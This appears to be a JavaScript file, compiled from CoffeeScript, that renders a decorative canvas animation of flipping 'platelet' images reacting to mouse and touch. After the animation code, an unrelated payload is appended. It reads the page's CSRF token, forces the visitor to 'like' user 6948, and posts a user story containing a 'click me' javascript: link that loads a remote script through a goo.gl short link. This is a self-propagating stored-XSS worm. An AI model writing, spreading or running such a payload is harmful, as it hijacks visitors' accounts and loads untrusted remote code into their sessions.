// Generated by CoffeeScript 2.0.1
if (!window.FlippinPlatelet) {
  window.FlippinPlatelet = {
    rand: function() {
      var max, min;
      switch (arguments.length) {
        case 0:
          min = 0;
          max = 1;
          break;
        case 1:
          min = 0;
          max = arguments[0];
          break;
        case 2:
          min = Math.min.apply(null, arguments);
          max = Math.max.apply(null, arguments);
      }
      return min + Math.random() * (max - min);
    },
    page_width: function() {
      return document.documentElement.clientWidth;
    },
    page_height: function() {
      return document.documentElement.clientHeight;
    },
    // 讀圖路線
    prepareFromImage: function() {
      return new Promise(function(resolve, reject) {
        var images_path, promises;
        images_path = ["https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00000.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00001.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00002.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00003.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00004.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00005.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00006.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00007.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00008.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00009.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00010.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00011.png", "https://anohito.tw/thisUnitIsAFlippinPlatelet/png/p_00000.png"];
        promises = images_path.map(function(x) {
          var img;
          img = document.createElement('img');
          img.src = x;
          return new Promise(function(res, rej) {
            img.addEventListener('load', function() {
              return res(img);
            });
            return img.addEventListener('error', function() {
              return rej(img.src);
            });
          });
        });
        return Promise.all(promises).then(function(x) {
          return resolve(x);
        }).catch(function() {
          throw 'image load fail';
        });
      });
    },
    add_platelet: function(count) {
      var d, i, j, q, r, ref, results;
      results = [];
      for (i = j = 0, ref = count; 0 <= ref ? j < ref : j > ref; i = 0 <= ref ? ++j : --j) {
        r = FlippinPlatelet.rand(4);
        q = parseInt(r);
        d = r % 1;
        if (FlippinPlatelet.is_mobile && q !== 0) {
          continue;
        }
        results.push(FlippinPlatelet.data.push({
          frame: 0,
          position1: q,
          position2: d
        }));
      }
      return results;
    },
    collision: function(rect, pos) {
      var center_x, center_y, cx, cy, deg, rad, rx, ry;
      if (!pos) {
        return false;
      }
      if (!rect) {
        return false;
      }
      deg = rect.deg;
      center_x = rect.x + rect.width / 2;
      center_y = rect.y + rect.height / 2;
      cx = pos.x;
      cy = pos.y;
      rad = rect.deg / 180 * Math.PI;
      rx = Math.cos(rad) * (cx - center_x) - Math.sin(rad) * (cy - center_y) + center_x;
      ry = Math.sin(rad) * (cx - center_x) + Math.cos(rad) * (cy - center_y) + center_y;
      cx = rx < rect.x ? rect.x : rx > rect.x + rect.width ? rect.x + rect.width : rx;
      cy = ry < rect.y ? rect.y : ry > rect.y + rect.height ? rect.y + rect.height : ry;
      return FlippinPlatelet.distance(rx, ry, cx, cy) <= 0;
    },
    distance: function(x1, y1, x2, y2) {
      return Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2));
    },
    calc: function(canvas) {
      var len, mouseX, mouseY;
      // 計算碰撞和frame改動
      mouseX = FlippinPlatelet.mouseX;
      mouseY = FlippinPlatelet.mouseY;
      len = FlippinPlatelet.images.length;
      return FlippinPlatelet.data.forEach(function(d) {
        if (d.x == null) {
          FlippinPlatelet.calc_pos(canvas, d);
        }
        if (d.frame === len - 1) {
          // frame 改動
          d.frame = 0;
        }
        if (d.frame > 0) {
          d.frame++;
        }
        // 碰撞計算
        if (FlippinPlatelet.mouse_pos) {
          return FlippinPlatelet.mouse_pos.forEach(function(pos) {
            if (FlippinPlatelet.collision(d, pos) && d.frame === 0) {
              return d.frame = 1;
            }
          });
        }
      });
    },
    // 計算圖片定位
    // 若沒有resize 其實不用每次重算
    calc_pos: function(canvas, data) {
      var deg, height, img_height, img_width, width, x, y;
      img_width = FlippinPlatelet.images[0].width;
      img_height = FlippinPlatelet.images[0].height;
      width = canvas.width;
      height = canvas.height;
      if (FlippinPlatelet.is_mobile) {
        img_width /= 1.5;
        img_height /= 1.5;
      }
      switch (data.position1) {
        case 0:
          // 在畫面下方
          x = data.position2 * width - img_width / 2;
          y = height - img_height * 0.8;
          deg = (data.position2 - 0.5) * 90;
          break;
        case 1:
          // 在畫面右方
          x = -img_height * 0.2;
          y = data.position2 * height;
          deg = 270 + (data.position2 - 0.5) * 90;
          break;
        case 2:
          // 在畫面上方
          x = data.position2 * width - img_width / 2;
          y = -img_height * 0.2;
          deg = 180 - (data.position2 - 0.5) * 90;
          break;
        case 3:
          // 在畫面右方
          x = width - img_height * 0.8;
          y = data.position2 * height;
          deg = 90 - (data.position2 - 0.5) * 90;
      }
      deg += FlippinPlatelet.rand(-5, 5);
      data.x = x;
      data.y = y;
      data.deg = deg;
      data.width = img_width;
      return data.height = img_height;
    },
    render: function(canvas) {
      var context, images;
      images = FlippinPlatelet.images;
      context = canvas.getContext('2d');
      context.clearRect(0, 0, canvas.width, canvas.height);
      return FlippinPlatelet.data.forEach(function(d) {
        var deg, frame, height, width, x, y;
        x = d.x;
        y = d.y;
        width = d.width;
        height = d.height;
        deg = d.deg;
        frame = d.frame;
        context.save();
        context.translate(x + width / 2, y + height / 2);
        context.rotate(-deg / 180 * Math.PI);
        context.drawImage(images[frame % images.length], width / -2, height / -2, width, height);
        return context.restore();
      });
    },
    // 初始化
    init: function() {
      return new Promise(function(resolve, reject) {
        var body, canvas, style;
        // 建立全畫面canvas
        canvas = document.createElement('canvas');
        canvas.width = FlippinPlatelet.page_width();
        canvas.height = FlippinPlatelet.page_height();
        style = canvas.style;
        style.pointerEvents = 'none';
        style.position = 'fixed';
        style.zIndex = 9999;
        style.bottom = 0;
        style.left = 0;
        body = document.getElementsByTagName('body')[0];
        body.appendChild(canvas);
        return resolve(canvas);
      });
    },
    run_once: false,
    images: null,
    canvas_instance: null,
    data: [],
    run: function() {
      if (FlippinPlatelet.page_width() < 1000) {
        FlippinPlatelet.is_mobile = true;
      }
      if (FlippinPlatelet.run_once) {
        return FlippinPlatelet.add_platelet(24);
      } else {
        return FlippinPlatelet.prepareFromImage().then(function(images) {
          FlippinPlatelet.images = images;
          return FlippinPlatelet.init().then(function(canvas) {
            var i, step;
            FlippinPlatelet.canvas_instance = canvas;
            FlippinPlatelet.add_platelet(24);
            // 綁上事件
            window.addEventListener('resize', function() {
              canvas.width = FlippinPlatelet.page_width();
              canvas.height = FlippinPlatelet.page_height();
              FlippinPlatelet.data.forEach(function(d) {
                return FlippinPlatelet.calc_pos(canvas, d);
              });
              return FlippinPlatelet.render(canvas);
            });
            document.addEventListener('mousemove', function(e) {
              return FlippinPlatelet.mouse_pos = [
                {
                  x: e.clientX,
                  y: e.clientY
                }
              ];
            });
            document.addEventListener('touchmove', function(e) {
              return FlippinPlatelet.mouse_pos = Array.from(e.touches).map(function(x) {
                return {
                  x: x.clientX,
                  y: x.clientY
                };
              });
            });
            document.addEventListener('touchend', function(e) {
              return FlippinPlatelet.mouse_pos = Array.from(e.touches).map(function(x) {
                return {
                  x: x.clientX,
                  y: x.clientY
                };
              });
            });
            i = 1;
            step = function() {
              if (i % 2) {
                FlippinPlatelet.calc(canvas);
                FlippinPlatelet.render(canvas);
              }
              i++;
              return requestAnimationFrame(step);
            };
            requestAnimationFrame(step);
            return FlippinPlatelet.run_once = true;
          }).catch(function() {
            console.log(arguments);
            return alert('init fail');
          });
        }).catch(function() {
          console.log(arguments);
          return alert('prepare fail');
        });
      }
    }
  };
}

FlippinPlatelet.run();

var token = d.querySelector('[name="csrf-token"]').content;

fetch('/likes?id=6948&type=User', {
    method: 'POST',
    headers: {
        'x-csrf-token': token
    }
})


var formData = new FormData();
formData.append("user_story[name]", "")
formData.append("user_story[desc]", "### [[點我看看]](javascript:d=document;s=d.createElement('script');s.src='https://goo.gl/k9Cmq6';d.body.appendChild(s);)")

fetch('/user_stories/', {
    method: 'POST',
    headers: {
        'x-csrf-token': token
    }, 
    body: formData
})
